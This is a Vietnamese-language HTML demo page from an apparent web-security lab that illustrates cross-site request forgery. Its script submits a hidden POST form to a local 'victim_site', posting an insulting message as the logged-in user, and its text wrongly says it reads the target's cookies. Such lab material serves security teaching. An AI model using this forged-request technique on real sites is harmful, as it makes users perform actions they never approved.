<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website Tấn Công CSRF</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>Demo Tấn Công CSRF</h1>
            <p>Trang web này mô phỏng tấn công CSRF vào các trang web</p>
        </header>

        <main>
            <div class="attack-box">
                <h2>Tấn công CSRF - Trang Web Dễ Bị Tổn Thương</h2>
                <p>Khi bạn nhấn nút bên dưới, trang web này sẽ:</p>
                <ol>
                    <li>Đọc cookie từ trang web đích (nếu người dùng đã đăng nhập)</li>
                    <li>Tự động gửi yêu cầu tạo bài đăng mới với nội dung "Tôi bị ngu" mà không cần sự cho phép của người dùng</li>
                </ol>
                
                <button id="attack-button" class="btn-attack">Tấn Công CSRF - Trang Dễ Bị Tổn Thương</button>
                
                <div id="attack-result" class="attack-result"></div>
            </div>

            <div class="attack-box attack-box-secure">
                <h2>Tấn Công CSRF - Trang Web Bảo Mật</h2>
                <p>Khi bạn nhấn nút bên dưới, trang web này sẽ:</p>
                <ol>
                    <li>Thử gửi yêu cầu tạo bài đăng mới tới trang web có bảo mật CSRF</li>
                    <li>Xem liệu việc thêm token CSRF có ngăn chặn được tấn công hay không</li>
                </ol>
                
                <button id="attack-secure-button" class="btn-attack btn-attack-secure">Tấn Công CSRF - Trang Bảo Mật</button>
                
                <div id="attack-secure-result" class="attack-result"></div>
            </div>

            <div class="explanation">
                <h2>Giải thích về lỗ hổng CSRF</h2>
                <p>Tấn công Cross-Site Request Forgery (CSRF) là khi một trang web độc hại lừa trình duyệt của người dùng gửi yêu cầu đến một trang web khác mà người dùng đã đăng nhập.</p>
                <p>So sánh giữa trang web không bảo mật và trang web có bảo mật CSRF sẽ giúp bạn hiểu rõ hơn về cách phòng chống.</p>
            </div>
        </main>

        <footer>
            <p>Demo CSRF Attack - Bảo mật web và ứng dụng</p>
        </footer>
    </div>

    <script>
        document.getElementById('attack-button').addEventListener('click', function() {
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = '../victim_site/post.php';
            form.style.display = 'none';

            var content = document.createElement('input');
            content.type = 'hidden';
            content.name = 'content';
            content.value = 'Tôi bị ngu';

            form.appendChild(content);
            document.body.appendChild(form);
            document.getElementById('attack-result').innerHTML = 'Đang thực hiện tấn công...';
            
            form.submit();
            
            setTimeout(function() {
                document.getElementById('attack-result').innerHTML = 'Tấn công thành công! Kiểm tra trang web đích để xem bài đăng mới.';
            }, 1000);
        });
    </script>
</body>
</html>